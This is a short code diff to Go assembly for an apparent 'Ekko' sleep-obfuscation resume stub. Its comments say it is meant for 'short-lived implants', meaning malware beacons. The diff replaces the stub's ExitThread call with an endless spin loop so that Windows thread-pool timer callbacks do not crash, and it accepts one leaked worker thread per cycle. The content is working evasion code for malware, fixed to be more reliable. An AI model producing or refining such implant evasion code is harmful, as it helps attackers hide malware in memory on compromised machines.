@@ -8,7 +8,12 @@
 // Go function. Steps:
 //   1. Load the resume-event handle from ·ekkoResumeEvent
 //   2. Call SetEvent(handle) via ·ekkoProcSetEvent
-//   3. Call ExitThread(0) via ·ekkoProcExitThread
+//   3. Spin forever — we cannot ExitThread here because that would
+//      abnormally unwind a Windows thread-pool callback and crash
+//      DeleteTimerQueueEx's bookkeeping. The thread pool notices the
+//      spin and eventually recycles the worker on its own schedule;
+//      the leak is one worker per Cycle, acceptable for short-lived
+//      implants and avoids the ExitThread hazard.
 //
 // Calling convention: Windows x64 — RCX = first arg, shadow space 0x20 on stack.
 TEXT ·resumeStub(SB), NOSPLIT|NOFRAME, $0
@@ -16,7 +21,6 @@ TEXT ·resumeStub(SB), NOSPLIT|NOFRAME, $0
 	MOVQ ·ekkoResumeEvent(SB), CX
 	MOVQ ·ekkoProcSetEvent(SB), AX
 	CALL AX
-	MOVQ $0, CX
-	MOVQ ·ekkoProcExitThread(SB), AX
-	CALL AX
-	BYTE $0xCC // INT3 — unreachable, ExitThread does not return
+spin:
+	PAUSE
+	JMP  spin
